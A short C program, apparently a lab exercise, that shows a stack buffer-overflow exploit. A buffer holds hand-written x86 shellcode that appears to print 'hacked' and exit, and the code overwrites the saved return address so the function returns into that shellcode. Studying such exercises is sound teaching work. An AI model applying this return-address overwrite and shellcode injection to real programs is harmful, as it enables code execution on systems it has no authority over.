#include <stdio.h>

#include <string.h>

void vulnerable() {

  //char s[28+0x200];
  char s[0x200]="h!\n\x00\x00hckedhattaj\x01[\x89\xe1j\nZRQS\xb8\x20\x09\x80\x00\xff\xd0j\x00\xb8\xc0\x10\x80\x00\xff\xd0";
 // gets(s);
    cprintf("%p\n",s);
    cprintf("%s\n",s);
  *(int *)(s+0x20c)=(int)(s);
  //cprintf("%p\n",s);
 // puts(s);
  return;

}

int main(void) {

  write(1,"xxxxx",5);
//  cprintf("s is %p",s);
  vulnerable();
  return 0;
}
    
